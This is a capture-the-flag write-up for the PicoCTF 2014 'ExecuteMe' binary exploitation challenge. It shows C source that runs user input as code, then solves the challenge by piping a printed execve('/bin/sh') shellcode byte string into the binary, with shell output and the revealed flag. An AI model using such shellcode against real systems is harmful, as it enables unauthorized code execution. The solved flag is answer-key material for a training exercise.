# Pico-CTF 2014: ExecuteMe

**Category:** Binary Exploitation
**Points:** 80
**Total Solves:** Not Available
## Problem Description:
[//]: # (Description of your problem. For eg use below description as a template)
[//]: # (> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c).)
> This program will run whatever you send to it! Try to get the flag! The binary can be found at /home/execute/ on the shell server. The source can be found [here](execute.c).

```c
#include <stdio.h>
#include <stdlib.h>

int token = 0;

typedef void (*function_ptr)();

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    char buf[128];

    be_nice_to_people();

    read(0, buf, 128);

    ((function_ptr)buf)();
}
```

## Write-up
[//]: # (> Your write up goes here.)
> We can see from the code that char array buf is typecasted as function pointer `function_ptr` then we can write shell code to buf variable and when function call is made shell code written in array buff executes. To get a flag we need to execute /bin/sh from binary. We could have executed by just directly writing `/bin/sh` to buf if it would have been directly passed to `system(buf)` call, but this is not the situation we need to provide assembly shell code which does this thing. Many websites provide shellcode, such as [shell-storm](http://shell-storm.org/shellcode/). For now, let's use this [shellcode](http://shell-storm.org/shellcode/files/shellcode-752.php) to run execve("/bin/sh").

> Running execute binary as : 
```(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | ./execute
(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | ./execute
ls
Makefile  execute  execute.c  flag.txt
cat flag.txt
shellcode_is_kinda_cool
^C
```

> Flag is : **shellcode_is_kinda_cool**

## Other write-ups and resources

* None
